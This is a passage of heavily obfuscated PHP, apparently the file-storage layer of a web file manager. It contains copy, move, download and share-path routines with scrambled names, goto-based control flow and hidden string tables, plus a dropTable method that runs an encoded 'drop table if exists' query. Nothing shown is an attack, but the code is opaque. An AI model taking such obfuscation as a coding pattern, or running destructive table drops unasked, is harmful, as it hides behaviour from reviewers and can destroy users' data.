($d¬Ìæ‘ÕòĞ) { $d¬Ìæ‘ÕòĞ->update($B¥õââÃ¹Ó - 1); } $b³Çğ¢»† = $a„ó±ôö®[33]; $B¥õââÃ¹Ó = 0; } } fclose($DÈŒ‹óÇ»); goto dåÊ¥À±ò›; AÉŒÅò—¬Ó: } public function dropTable($Bì„°›È‡™ = null) { $Cïô˜åÄ® = $this->model()->db(); $A¢àÙÇÀî» = $Bì„°›È‡™ ? array($Bì„°›È‡™) : $Cïô˜åÄ®->getTables(); if (!$A¢àÙÇÀî») { return; } foreach ($A¢àÙÇÀî» as $Bì„°›È‡™) { $Cïô˜åÄ®->execute("\144\x72\157\160\40\164\141\142\154\x65\x20\151\146\x20\145\x78\151\x73\164\x73\x20\140{$Bì„°›È‡™}\x60"); } } private function taskToCache($F©ÈƒŠ”æ = null) { $FËÆÊÏÊ¼Ô =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$F©ÈƒŠ”æ) { return; } $fˆâİê¹–” = array($FËÆÊÏÊ¼Ô[982] => $F©ÈƒŠ”æ->task[$FËÆÊÏÊ¼Ô[982]], $FËÆÊÏÊ¼Ô[980] => $F©ÈƒŠ”æ->task[$FËÆÊÏÊ¼Ô[980]], $FËÆÊÏÊ¼Ô[994] => $F©ÈƒŠ”æ->task[$FËÆÊÏÊ¼Ô[994]]); if ($fˆâİê¹–”[$FËÆÊÏÊ¼Ô[980]] == $fˆâİê¹–”[$FËÆÊÏÊ¼Ô[994]]) { $fˆâİê¹–”[$FËÆÊÏÊ¼Ô[697]] = 1; } Cache::set($FËÆÊÏÊ¼Ô[995] . $F©ÈƒŠ”æ->task[$FËÆÊÏÊ¼Ô[367]], $fˆâİê¹–”); $F©ÈƒŠ”æ->end(); } private function sqlEncode($cÆ¡Ñ‰ËŸ½) { $c‰»±óôá¢ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $Cˆ²‘Ş¥… = array(); foreach ($cÆ¡Ñ‰ËŸ½ as $dÁæšõ£·‡) { if (is_array($dÁæšõ£·‡)) { $dÁæšõ£·‡ = json_encode_force($dÁæšõ£·‡); } $dÁæšõ£·‡ = addslashes($dÁæšõ£·‡); $dÁæšõ£·‡ = str_replace(array($c‰»±óôá¢[996], $c‰»±óôá¢[217]), array($c‰»±óôá¢[997], $c‰»±óôá¢[998]), $dÁæšõ£·‡); $Cˆ²‘Ş¥…[] = str_replace($c‰»±óôá¢[55], $c‰»±óôá¢[999], $dÁæšõ£·‡); } return $c‰»±óôá¢[55] . implode($c‰»±óôá¢[1000], $Cˆ²‘Ş¥…) . $c‰»±óôá¢[55]; } private function sqlDecode($eùÎÆ…„ÎÆ, $e©Â—Î±Ô) { $dÍÏÜÁŸº¬ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $eùÎÆ…„ÎÆ = str_replace(array($dÍÏÜÁŸº¬[997], $dÍÏÜÁŸº¬[998]), array($dÍÏÜÁŸº¬[996], $dÍÏÜÁŸº¬[217]), $eùÎÆ…„ÎÆ); if ($e©Â—Î±Ô == $dÍÏÜÁŸº¬[9]) { $eùÎÆ…„ÎÆ = stripslashes($eùÎÆ…„ÎÆ); } return $eùÎÆ…„ÎÆ; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($f°É‰­ñËó, $F‚³¢‚ˆ¯) { $FóİÕîö”ñ = self::driverMake($F‚³¢‚ˆ¯[0]); if (method_exists($FóİÕîö”ñ, $f°É‰­ñËó)) { return @call_user_func_array(array($FóİÕîö”ñ, $f°É‰­ñËó), $F‚³¢‚ˆ¯); } if (method_exists($FóİÕîö”ñ, $_SERVER[´Ù×Íå‘ÄõÛ][1001])) { return @call_user_func_array(array($FóİÕîö”ñ, $f°É‰­ñËó), $F‚³¢‚ˆ¯); } else { if (method_exists(self, $f°É‰­ñËó)) { return @call_user_func_array(array(self, $f°É‰­ñËó), $F‚³¢‚ˆ¯); } else { call_user_func_array(array(parent, $f°É‰­ñËó), $F‚³¢‚ˆ¯); } } } public static function init($C¡‹Óëç…·) { return self::driverMake($C¡‹Óëç…·); } public static function copy($f¤ÔÔ—Ä»Ö, $CÉä¹ƒ¨ò¼, $FÙìÒÏŒ‘ë = false, $bï¸èŞ‡ñ• = false) { return self::copyMove($f¤ÔÔ—Ä»Ö, $CÉä¹ƒ¨ò¼, $FÙìÒÏŒ‘ë, $_SERVER[´Ù×Íå‘ÄõÛ][492], $bï¸èŞ‡ñ•); } public static function move($bâš±ÅåÖí, $BæÔÉ±ãÍ, $fôã¥³õÒ = false, $Dåæö = false) { return self::copyMove($bâš±ÅåÖí, $BæÔÉ±ãÍ, $fôã¥³õÒ, $_SERVER[´Ù×Íå‘ÄõÛ][494], $Dåæö); } public static function saveFile($Bï– áÇ‡¿, $c’õ¦£šÀË, $dî“‹‘ÃÉ³ = true) { goto cƒÔ´ƒ¢š¿; e¼åñ’±Ç–: $e³™À›­¯ = self::copyFile($FöÃï‘©, $Bï– áÇ‡¿, $cË±ˆ“àÔÆ, $dÖ°Œù²Å, $Eö² ëÕ‚ï[$F›Šê´«Ñ[28]], $E²ê­Éâ­); if ($D³Úí×Ä‰Î) { $e³™À›­¯ = $D³Úí×Ä‰Î->getPathOuter($e³™À›­¯); } return $e³™À›­¯; goto c‹Ë¡©áœ; cƒÔ´ƒ¢š¿: $F›Šê´«Ñ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $Eö² ëÕ‚ï = self::info($c’õ¦£šÀË); $FöÃï‘© = self::driverMake($Bï– áÇ‡¿); goto CŠ‹ğá¤“ˆ; Eí©ÜóµÑë: $dÖ°Œù²Å = $cË±ˆ“àÔÆ->pathFather($c’õ¦£šÀË); $E²ê­Éâ­ = !0; if (!$dî“‹‘ÃÉ³ && self::driverIsSame($FöÃï‘©, $cË±ˆ“àÔÆ)) { $E²ê­Éâ­ = !1; } goto e¼åñ’±Ç–; CŠ‹ğá¤“ˆ: $cË±ˆ“àÔÆ = self::driverMake($c’õ¦£šÀË); $D³Úí×Ä‰Î = !1; if ($cË±ˆ“àÔÆ->pathParse[$F›Šê´«Ñ[1002]]) { $fåõÎÍÎËº = $cË±ˆ“àÔÆ->pathParse[$F›Šê´«Ñ[1002]]; $D³Úí×Ä‰Î = $cË±ˆ“àÔÆ; $cË±ˆ“àÔÆ = self::driverMake($fåõÎÍÎËº); } goto Eí©ÜóµÑë; c‹Ë¡©áœ: } private static function copyMove($AÛèâˆÁ»Ş, $AÜí²ÕÄÌ, $BÀ×–íŸ²‚, $BÑ‚òë©‘«, $dÜ‡ˆ…Ì‹ = false) { goto FÃ½‰Òøâ—; AèÉæ‰÷©: $FœÃä¹ï…Í = self::driverMake($AÛèâˆÁ»Ş); $aã­µÇ¡ª× = self::driverMake($AÜí²ÕÄÌ); $EÔ†ÀåÕÍ¶ = $BÑ‚òë©‘« == $AÚÖ†ÄŠ‹[494]; goto A¡ñËî·Í˜; aµÓŒò¾Ã: if ($a–ø²†Ú–¡) { $bÊ—ºäÆ²± = $a–ø²†Ú–¡->getPathOuter($bÊ—ºäÆ²±); } return $bÊ—ºäÆ²±; goto a´Ú²×µ‚©; FÃ½‰Òøâ—: $AÚÖ†ÄŠ‹ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$AÛèâˆÁ»Ş || $AÛèâˆÁ»Ş == $AÚÖ†ÄŠ‹[8] || !$AÜí²ÕÄÌ) { return !1; } ignore_timeout(); goto AèÉæ‰÷©; a³‹ŸÒÛê‚: $a¡Ê‰Åó¥Á = $FœÃä¹ï…Í->isFile($AÛèâˆÁ»Ş); if (!$a¡Ê‰Åó¥Á && $aã­µÇ¡ª×->getType() == $AÚÖ†ÄŠ‹[695] && $FœÃä¹ï…Í->getType() == $AÚÖ†ÄŠ‹[102]) { $bÊ—ºäÆ²± = $aã­µÇ¡ª×->copyFolderFromIO($FœÃä¹ï…Í, $AÛèâˆÁ»Ş, $AÜí²ÕÄÌ, $BÀ×–íŸ²‚, $EÔ†ÀåÕÍ¶, $dÜ‡ˆ…Ì‹); } else { $bÊ—ºäÆ²± = self::copyPath($FœÃä¹ï…Í, $AÛèâˆÁ»Ş, $aã­µÇ¡ª×, $AÜí²ÕÄÌ, $BÀ×–íŸ²‚, $EÔ†ÀåÕÍ¶, $a¡Ê‰Åó¥Á, $dÜ‡ˆ…Ì‹); } if ($bÊ—ºäÆ²± && $EÔ†ÀåÕÍ¶) { $FœÃä¹ï…Í->remove($AÛèâˆÁ»Ş); } goto aµÓŒò¾Ã; Bß¾¬†ÙÙˆ: Hook::trigger($AÚÖ†ÄŠ‹[72], $FœÃä¹ï…Í, $AÛèâˆÁ»Ş, $aã­µÇ¡ª×, $AÜí²ÕÄÌ); $Cö‡„£µó = self::driverIsSame($FœÃä¹ï…Í, $aã­µÇ¡ª×); if ($Cö‡„£µó) { if ($BÑ‚òë©‘« == $AÚÖ†ÄŠ‹[494] && !method_exists($aã­µÇ¡ª×, $AÚÖ†ÄŠ‹[1003]) && trim($AÜí²ÕÄÌ, $AÚÖ†ÄŠ‹[8]) == trim($aã­µÇ¡ª×->pathFather($AÛèâˆÁ»Ş), $AÚÖ†ÄŠ‹[8])) { return $aã­µÇ¡ª×->getPathOuter($AÛèâˆÁ»Ş); } if (method_exists($aã­µÇ¡ª×, $BÑ‚òë©‘«)) { return $aã­µÇ¡ª×->{$BÑ‚òë©‘«}($AÛèâˆÁ»Ş, $AÜí²ÕÄÌ, $BÀ×–íŸ²‚); } } goto a³‹ŸÒÛê‚; A¡ñËî·Í˜: $a–ø²†Ú–¡ = !1; if ($aã­µÇ¡ª×->pathParse[$AÚÖ†ÄŠ‹[1002]]) { $AÜí²ÕÄÌ = $aã­µÇ¡ª×->pathParse[$AÚÖ†ÄŠ‹[1002]]; $a–ø²†Ú–¡ = $aã­µÇ¡ª×; $aã­µÇ¡ª× = self::driverMake($AÜí²ÕÄÌ); } self::check($FœÃä¹ï…Í, $AÛèâˆÁ»Ş, $aã­µÇ¡ª×, $AÜí²ÕÄÌ); goto Bß¾¬†ÙÙˆ; a´Ú²×µ‚©: } private static function check($c®Ö“æ…, $EÍ’İºê½, $aô•šƒœà­, &$D›’éÑÄ¸) { $A…–”ÕÂÖğ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (self::driverIsSame($c®Ö“æ…, $aô•šƒœà­) && $c®Ö“æ…->isFolder($EÍ’İºê½) && $c®Ö“æ…->isParentOf($EÍ’İºê½, $D›’éÑÄ¸)) { show_json(LNG($A…–”ÕÂÖğ[1004]), !1); } if (!$c®Ö“æ…->exist($EÍ’İºê½)) { show_json(LNG($A…–”ÕÂÖğ[101]), !1); } } private static function copyPath($DõŞ÷Â¿, $e„·Ö¸ÊÌŠ, $b’êÇóÁ¤, $fÆ·ôÑìñĞ, $aĞ¼‹‡øë, $c˜’ÂÇÂÇ§, $b¾¹ŒœÉê, $D®‘¸ß¬àÔ = false) { goto bŞÂõÑ‰ïˆ; fç‘ëé…¤ô: $E÷Ûšù¯®š = array_merge($AÌÏå†è¯“[$cà×¡›[73]], $AÌÏå†è¯“[$cà×¡›[74]]); foreach ($E÷Ûšù¯®š as $FÒŸÇğÆ¦ñ) { $fÅ¶ˆ‘½Âé = $FÒŸÇğÆ¦ñ[$cà×¡›[29]] == $cà×¡›[167]; $e„·Ö¸ÊÌŠ = $DõŞ÷Â¿->getPathInner($FÒŸÇğÆ¦ñ[$cà×¡›[75]]); $B…š³Ïö–¨ = self::copyPath($DõŞ÷Â¿, $e„·Ö¸ÊÌŠ, $b’êÇóÁ¤, $fÆ·ôÑìñĞ, $aĞ¼‹‡øë, $c˜’ÂÇÂÇ§, $fÅ¶ˆ‘½Âé); if (!$B…š³Ïö–¨) { write_log($cà×¡›[1005] . $e„·Ö¸ÊÌŠ . $cà×¡›[1006] . $fÆ·ôÑìñĞ, $cà×¡›[1007]); } } return $bÌ×âÏ‹‘ò; goto cŸŒ“ï¥ÍÖ; d‚ÆÁã†: if ($b¾¹ŒœÉê) { return self::copyFile($DõŞ÷Â¿, $e„·Ö¸ÊÌŠ, $b’êÇóÁ¤, $fÆ·ôÑìñĞ, $CÓ„—ïˆ, $c˜’ÂÇÂÇ§); } if ($aĞ¼‹‡øë == REPEAT_RENAME_FOLDER) { $aĞ¼‹‡øë = !1; } $CÉ¨„ùå = rtrim($fÆ·ôÑìñĞ, $cà×¡›[8]) . $cà×¡›[8] . $CÓ„—ïˆ; goto cËÑ¬ä™; bŞÂõÑ‰ïˆ: $cà×¡› =& $_SERVER[´Ù×Íå‘ÄõÛ]; $CÓ„—ïˆ = $D®‘¸ß¬àÔ ? $D®‘¸ß¬àÔ : $DõŞ÷Â¿->getPathName($DõŞ÷Â¿->pathThis($e„·Ö¸ÊÌŠ)); if ($aĞ¼‹‡øë) { $a‚ø‚èãÆ = $b’êÇóÁ¤->fileNameExist($fÆ·ôÑìñĞ, $CÓ„—ïˆ); $CÓ„—ïˆ = $b’êÇóÁ¤->fileNameAuto($fÆ·ôÑìñĞ, $CÓ„—ïˆ, $aĞ¼‹‡øë, !$b¾¹ŒœÉê); $aĞ¼‹‡øë = $a‚ø‚èãÆ ? $aĞ¼‹‡øë : !1; } goto d‚ÆÁã†; cËÑ¬ä™: $bÌ×âÏ‹‘ò = $b’êÇóÁ¤->mkdir($b’êÇóÁ¤->getPath($CÉ¨„ùå)); $fÆ·ôÑìñĞ = $b’êÇóÁ¤->getPathInner($bÌ×âÏ‹‘ò); $AÌÏå†è¯“ = $DõŞ÷Â¿->listPath($e„·Ö¸ÊÌŠ, !0); goto fç‘ëé…¤ô; cŸŒ“ï¥ÍÖ: } private static function copyFile($CÜ‹Ó×ó, $Bê…Ç®‰ß®, $AÉ¦·‚¶, $d±Âö­¸¨¿, $CôÔÍ´„Ù, $CÍ•ŠôçØÕ) { goto fÈ‚ˆ«‡’“; bœÇ¼‘áÌ: Hook::trigger($E°ì¹Êô§[1010], $CÜ‹Ó×ó, $Bê…Ç®‰ß®, $AÉ¦·‚¶, $d±Âö­¸¨¿, $CôÔÍ´„Ù, $a¶™êÀÏœ); return $a¶™êÀÏœ; goto dä›Àó·õÖ; C…ŒÙ«‚ŸÓ: mk_dir($Eõö½½™Ô); $b†ˆÌô‹ë = $Eõö½½™Ô . $båå‡¥¬É; $b†ˆÌô‹ë = $CÜ‹Ó×ó->download($Bê…Ç®‰ß®, $b†ˆÌô‹ë); goto A¶˜„àØÔ„; A¶˜„àØÔ„: $b†ˆÌô‹ë = $CÜ‹Ó×ó->iconvApp($b†ˆÌô‹ë); $a¶™êÀÏœ = $AÉ¦·‚¶->upload($d±Âö­¸¨¿, $b†ˆÌô‹ë, $CÍ•ŠôçØÕ); self::remove($Eõö½½™Ô . $båå‡¥¬É); goto bœÇ¼‘áÌ; b„÷‰ñ´¼É: Hook::trigger($E°ì¹Êô§[1009], $CÜ‹Ó×ó, $Bê…Ç®‰ß®, $AÉ¦·‚¶, $d±Âö­¸¨¿, $CôÔÍ´„Ù, $båå‡¥¬É); if (self::driverIsSame($CÜ‹Ó×ó, $AÉ¦·‚¶)) { if ($CÍ•ŠôçØÕ) { $a¶™êÀÏœ = $AÉ¦·‚¶->moveFile($Bê…Ç®‰ß®, $d±Âö­¸¨¿); } else { $a¶™êÀÏœ = $AÉ¦·‚¶->copyFile($Bê…Ç®‰ß®, $d±Âö­¸¨¿); } Hook::trigger($E°ì¹Êô§[1010], $CÜ‹Ó×ó, $Bê…Ç®‰ß®, $AÉ¦·‚¶, $d±Âö­¸¨¿, $CôÔÍ´„Ù, $a¶™êÀÏœ); return $a¶™êÀÏœ; } $Eõö½½™Ô = TEMP_FILES; goto C…ŒÙ«‚ŸÓ; fÈ‚ˆ«‡’“: $E°ì¹Êô§ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $d±Âö­¸¨¿ = $AÉ¦·‚¶->getPath(rtrim($d±Âö­¸¨¿, $E°ì¹Êô§[8]) . $E°ì¹Êô§[8] . $CôÔÍ´„Ù); $båå‡¥¬É = $E°ì¹Êô§[1008] . time() . rand_string(5); goto b„÷‰ñ´¼É; dä›Àó·õÖ: } public static function pathFather($bÈÄÅ³ó¥) { $f¥ò¿ÚÌ«Ğ = IO::init($bÈÄÅ³ó¥); $bÔöõØÁƒÂ = $f¥ò¿ÚÌ«Ğ->pathFather($f¥ò¿ÚÌ«Ğ->path); return $f¥ò¿ÚÌ«Ğ->getPathOuter($bÔöõØÁƒÂ); } public static function fileOut($f»†‚´ß†•, $aµá‘Şá½£ = false, $EĞÄïó»¦ = false, $AÏÊìÕ¢æñ = '') { $AÁÍêâÍÍã = self::driverMake($f»†‚´ß†•); if ($AÁÍêâÍÍã->isFileOutServer()) { return $AÁÍêâÍÍã->fileOutServer($f»†‚´ß†•, $aµá‘Şá½£, $EĞÄïó»¦, $AÏÊìÕ¢æñ); } return $AÁÍêâÍÍã->fileOut($f»†‚´ß†•, $aµá‘Şá½£, $EĞÄïó»¦, $AÏÊìÕ¢æñ); } public static function fileOutImage($BãïÌ˜©‰, $AÖğ³öÙ­÷ = 250) { $d„¾ÎÛ•²· = array(250, 600, 1200, 3000); for ($dÌ³”­õä = 0; $dÌ³”­õä < count($d„¾ÎÛ•²·); $dÌ³”­õä++) { if ($dÌ³”­õä == 0 && $AÖğ³öÙ­÷ <= $d„¾ÎÛ•²·[$dÌ³”­õä]) { $AÖğ³öÙ­÷ = $d„¾ÎÛ•²·[$dÌ³”­õä]; break; } else { if ($AÖğ³öÙ­÷ > $d„¾ÎÛ•²·[$dÌ³”­õä - 1] && $AÖğ³öÙ­÷ <= $d„¾ÎÛ•²·[$dÌ³”­õä]) { $AÖğ³öÙ­÷ = $d„¾ÎÛ•²·[$dÌ³”­õä]; break; } else { if ($dÌ³”­õä == count($d„¾ÎÛ•²·) - 1 && $AÖğ³öÙ­÷ > $d„¾ÎÛ•²·[$dÌ³”­õä]) { $AÖğ³öÙ­÷ = $d„¾ÎÛ•²·[$dÌ³”­õä]; break; } } } } $F›çİ·Ş³÷ = self::driverMake($BãïÌ˜©‰); if ($F›çİ·Ş³÷->isFileOutServer()) { return $F›çİ·Ş³÷->fileOutImageServer($BãïÌ˜©‰, $AÖğ³öÙ­÷); } return $F›çİ·Ş³÷->fileOutImage($BãïÌ˜©‰, $AÖğ³öÙ­÷); } private static function driverIsSame($a­¿‡•àÛ, $d¨“ Òöœõ) { goto Dô¢Èï Ãï; B¶á©·îàÑ: if ($AÁ¨áë‚øß != $aÇäÆ«¯ğ) { return !1; } if ($AÁ¨áë‚øß == $c¨îºÅß“Å[695]) { return !0; } if ($AÁ¨áë‚øß == $c¨îºÅß“Å[102]) { return !0; } goto c‚¸ŸººÄº; c‚¸ŸººÄº: if ($a­¿‡•àÛ->pathDriver == $d¨“ Òöœõ->pathDriver) { return !0; } return !1; goto báËÈ»³í¦; Dô¢Èï Ãï: $c¨îºÅß“Å =& $_SERVER[´Ù×Íå‘ÄõÛ]; $AÁ¨áë‚øß = $a­¿‡•àÛ->getType(); $aÇäÆ«¯ğ = $d¨“ Òöœõ->getType(); goto B¶á©·îàÑ; báËÈ»³í¦: } public static function copyUpdate($d‹ùÇİ³Ùê, $Dô¹Ê‡’™İ) { goto CŞØùØî—; CŞØùØî—: $bÓãÚœ®Ùì =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!IO::exist($d‹ùÇİ³Ùê)) { return !1; } if (!IO::exist($Dô¹Ê‡’™İ)) { IO::mkdir($Dô¹Ê‡’™İ); } goto D­¶ª„†; D­¶ª„†: $f¶‰³ÉèÅ = self::_listAll($d‹ùÇİ³Ùê); $AŸ´ßò’º = self::_listAll($Dô¹Ê‡’™İ); $EÃŒ„î·‹ = array(); goto eÎîÓå‘Œ‰; eÎîÓå‘Œ‰: $fÇò¾šäø„ = array(); foreach ($f¶‰³ÉèÅ as $bà˜”¼Ô¿ç => $D¿ööé¦ã‘) { if (isset($AŸ´ßò’º[$bà˜”¼Ô¿ç])) { if ($D¿ööé¦ã‘[$bÓãÚœ®Ùì[76]] == 1) { continue; } if ($AŸ´ßò’º[$bà˜”¼Ô¿ç][$bÓãÚœ®Ùì[77]] == $D¿ööé¦ã‘[$bÓãÚœ®Ùì[77]]) { continue; } } if ($D¿ööé¦ã‘[$bÓãÚœ®Ùì[76]] == 1) { $fÇò¾šäø„[] = $Dô¹Ê‡’™İ . $bÓãÚœ®Ùì[8] . $bà˜”¼Ô¿ç; continue; } $BÂï£š± = strstr(trim($bà˜”¼Ô¿ç, $bÓãÚœ®Ùì[8]), $bÓãÚœ®Ùì[8]) ? get_path_father($bà˜”¼Ô¿ç) : $bÓãÚœ®Ùì[33]; $EÃŒ„î·‹[] = array($bÓãÚœ®Ùì[1011] => $D¿ööé¦ã‘[$bÓãÚœ®Ùì[75]], $bÓãÚœ®Ùì[1012] => rtrim($Dô¹Ê‡’™İ, $bÓãÚœ®Ùì[8]) . $bÓãÚœ®Ùì[8] . $BÂï£š±, $bÓãÚœ®Ùì[1013] => $D¿ööé¦ã‘); } $D½¨®–¦·¼ = array($bÓãÚœ®Ùì[167] => $EÃŒ„î·‹, $bÓãÚœ®Ùì[76] => $fÇò¾šäø„); goto cêéŠäÜêÄ; cêéŠäÜêÄ: Hook::trigger($bÓãÚœ®Ùì[1014], $d‹ùÇİ³Ùê, $Dô¹Ê‡’™İ, $D½¨®–¦·¼); foreach ($fÇò¾šäø„ as $D¿ööé¦ã‘) { IO::mkdir($D¿ööé¦ã‘); } foreach ($EÃŒ„î·‹ as $D¿ööé¦ã‘) { IO::copy($D¿ööé¦ã‘[$bÓãÚœ®Ùì[1011]], $D¿ööé¦ã‘[$bÓãÚœ®Ùì[1012]], REPEAT_REPLACE); } goto BÄœÉî†³; BÄœÉî†³: } private static function _listAll($dÇÃÙ®ŸÄ¨) { $c†¥çÏ¥Ò =& $_SERVER[´Ù×Íå‘ÄõÛ]; $dÇÃÙ®ŸÄ¨ = KodIO::clear($dÇÃÙ®ŸÄ¨); $CÅ™Õö­¿³ = IO::listAll($dÇÃÙ®ŸÄ¨); foreach ($CÅ™Õö­¿³ as &$f×Í›é“öÖ) { $a»¨À¸ØˆÉ = substr($f×Í›é“öÖ[$c†¥çÏ¥Ò[75]], strlen($dÇÃÙ®ŸÄ¨)); $f×Í›é“öÖ[$c†¥çÏ¥Ò[1015]] = trim($a»¨À¸ØˆÉ, $c†¥çÏ¥Ò[8]); } return array_to_keyvalue($CÅ™Õö­¿³, $c†¥çÏ¥Ò[1015]); } public static function fileSubstr($e÷‚Ÿˆ°Ø, $Eî’ç…¤ø, $AëÉß”Öø = false) { goto Aø”‹ŸŸæ„; dçĞ¬¯Ê¿: if ($Eî’ç…¤ø + $AëÉß”Öø > $eÎ‹ÅÑ›Å) { $AëÉß”Öø = $eÎ‹ÅÑ›Å - $Eî’ç…¤ø; } if ($AëÉß”Öø <= 0) { return $_SERVER[´Ù×Íå‘ÄõÛ][33]; } if ($Eî’ç…¤ø < 0 || $Eî’ç…¤ø >= $eÎ‹ÅÑ›Å || $AëÉß”Öø > 1024 * 1024 * 5) { throw new Exception("\x66\x69\x6c\145\x52\145\141\x64\40\x65\x72\x72\x6f\x72\41\x20\163\164\x61\162\164\x3d{$Eî’ç…¤ø}\x3b\x6c\145\156\147\x74\x68\75{$AëÉß”Öø}\73\x20\x73\x69\x7a\145\x3d{$eÎ‹ÅÑ›Å}\73"); } goto dÁ·³èË; bäÎÙ©ìÃ«: $a—¨š¬ÌÏ› = $AëÉß”Öø; if ($Eî’ç…¤ø < 0) { $Eî’ç…¤ø = $eÎ‹ÅÑ›Å + $Eî’ç…¤ø; } if ($AëÉß”Öø === !1) { $AëÉß”Öø = $eÎ‹ÅÑ›Å - $Eî’ç…¤ø; } goto dçĞ¬¯Ê¿; Aø”‹ŸŸæ„: $E…£˜ÉÊÀ = self::driverMake($e÷‚Ÿˆ°Ø); $eÎ‹ÅÑ›Å = $E…£˜ÉÊÀ->size($e÷‚Ÿˆ°Ø); $d³«â™¹¦ = $Eî’ç…¤ø; goto bäÎÙ©ìÃ«; dÁ·³èË: return $E…£˜ÉÊÀ->fileSubstr($e÷‚Ÿˆ°Ø, $Eî’ç…¤ø, $AëÉß”Öø); goto dÁµµÄ˜Ò; dÁµµÄ˜Ò: } private static function driverMake(&$e¸Ïß‰éæ³) { goto aÉğÒ¶Öß˜; aÉğÒ¶Öß˜: $c’°˜Üåò¦ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $B§•‡»µîÃ = KodIO::parse($e¸Ïß‰éæ³); if (!self::$driverListSystem) { $A¤´ÁŒ—ç– = Model($c’°˜Üåò¦[704])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($A¤´ÁŒ—ç–, $c’°˜Üåò¦[367]); } goto fòî¤æœÄ; fòî¤æœÄ: if ($B§•‡»µîÃ[$c’°˜Üåò¦[29]] == KodIO::KOD_IO && !self::$driverListSystem[$B§•‡»µîÃ[$c’°˜Üåò¦[367]]]) { return !1; } $e¸Ïß‰éæ³ = $B§•‡»µîÃ[$c’°˜Üåò¦[1016]]; $dİ‡»í®àê = self::driverGet($B§•‡»µîÃ, $e¸Ïß‰éæ³); goto Cº’Ãµêêë; Cº’Ãµêêë: return $dİ‡»í®àê; goto EÜ¨¯·ö¼Ü; EÜ¨¯·ö¼Ü: } private static function driverGet($E½ó©™ó¦, &$fê“©³Ö—ñ) { goto bŞËĞå®ì; CîîÌØÖ¥ : if (isset($e®Ûø«Òª[$DîÏÉçË†Ğ[6]][$DîÏÉçË†Ğ[1028]])) { $dèíàÊØ«Ï->pathBase = rtrim($e®Ûø«Òª[$DîÏÉçË†Ğ[6]][$DîÏÉçË†Ğ[1028]], $DîÏÉçË†Ğ[8]) . $DîÏÉçË†Ğ[8]; $fê“©³Ö—ñ = $dèíàÊØ«Ï->pathBase . ltrim($fê“©³Ö—ñ, $DîÏÉçË†Ğ[8]); } $fê“©³Ö—ñ = $dèíàÊØ«Ï->getPath($fê“©³Ö—ñ); if (isset($E½ó©™ó¦[$DîÏÉçË†Ğ[1002]])) { $fê“©³Ö—ñ = $E½ó©™ó¦[$DîÏÉçË†Ğ[1002]]; } goto b”ª‹ì‘‰; dòÇÑÓƒºÕ: switch ($E½ó©™ó¦[$DîÏÉçË†Ğ[29]]) { case KodIO::KOD_IO: $e®Ûø«Òª = self::$driverListSystem[$CŞ™ß³¸¾‘]; break; case KodIO::KOD_SOURCE: $fê“©³Ö—ñ = $CŞ™ß³¸¾‘ . $fê“©³Ö—ñ; $e®Ûø«Òª = array($DîÏÉçË†Ğ[1018] => $DîÏÉçË†Ğ[1019], $DîÏÉçË†Ğ[6] => $E½ó©™ó¦); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $BÄí—¤Ïù¿ = $GLOBALS[$DîÏÉçË†Ğ[1020]]; self::$driverListUser = array_to_keyvalue($BÄí—¤Ïù¿, $DîÏÉçË†Ğ[367]); } $e®Ûø«Òª = self::$driverListUser[$CŞ™ß³¸¾‘]; break; case KodIO::KOD_SHARE_LINK: $e®Ûø«Òª = array($DîÏÉçË†Ğ[1018] => $DîÏÉçË†Ğ[1021], $DîÏÉçË†Ğ[6] => $E½ó©™ó¦); $DÂÀ‹Á×Ïá = Action($DîÏÉçË†Ğ[1022])->sharePathInfo($E½ó©™ó¦[$DîÏÉçË†Ğ[75]]); $fê“©³Ö—ñ = $DÂÀ‹Á×Ïá[$DîÏÉçË†Ğ[369]]; if (!$DÂÀ‹Á×Ïá[$DîÏÉçË†Ğ[369]]) { $b‘¹Äèáäè = Model($DîÏÉçË†Ğ[538])->getInfo($DÂÀ‹Á×Ïá[$DîÏÉçË†Ğ[441]]); $fê“©³Ö—ñ = KodIO::clear($b‘¹Äèáäè[$DîÏÉçË†Ğ[1023]] . $E½ó©™ó¦[$DîÏÉçË†Ğ[1016]]); $E½ó©™ó¦[$DîÏÉçË†Ğ[439]] = $b‘¹Äèáäè; $E½ó©™ó¦[$DîÏÉçË†Ğ[1002]] = $fê“©³Ö—ñ; $e®Ûø«Òª = array($DîÏÉçË†Ğ[1018] => $DîÏÉçË†Ğ[1024], $DîÏÉçË†Ğ[6] => $E½ó©™ó¦); } break; case KodIO::KOD_SHARE_ITEM: $e®Ûø«Òª = array($DîÏÉçË†Ğ[1018] => $DîÏÉçË†Ğ[1025], $DîÏÉçË†Ğ[6] => $E½ó©™ó¦); $b‘¹Äèáäè = Model($DîÏÉçË†Ğ[538])->getInfo($E½ó©™ó¦[$DîÏÉçË†Ğ[367]]); if ($b‘¹Äèáäè[$DîÏÉçË†Ğ[369]] == $DîÏÉçË†Ğ[470]) { $fê“©³Ö—ñ = KodIO::clear($b‘¹Äèáäè[$DîÏÉçË†Ğ[1023]] . $E½ó©™ó¦[$DîÏÉçË†Ğ[1016]]); $E½ó©™ó¦[$DîÏÉçË†Ğ[439]] = $b‘¹Äèáäè; $E½ó©™ó¦[$DîÏÉçË†Ğ[1002]] = $fê“©³Ö—ñ; $e®Ûø«Òª = array($DîÏÉçË†Ğ[1018] => $DîÏÉçË†Ğ[1026], $DîÏÉçË†Ğ[6] => $E½ó©™ó¦); } else { if (!$fê“©³Ö—ñ) { $fê“©³Ö—ñ = $b‘¹Äèáäè[$DîÏÉçË†Ğ[369]]; } } break; default: $fê“©³Ö—ñ = $E½ó©™ó¦[$DîÏÉçË†Ğ[75]]; $e®Ûø«Òª = array($DîÏÉçË†Ğ[1018] => $DîÏÉçË†Ğ[1027]); break; } $dšêéˆ›Ë¬ = $E½ó©™ó¦[$DîÏÉçË†Ğ[75]]; if (!isset(self::$driverCache[$dšêéˆ›Ë¬])) { $bŞ÷ğ¹‹µ¢ = 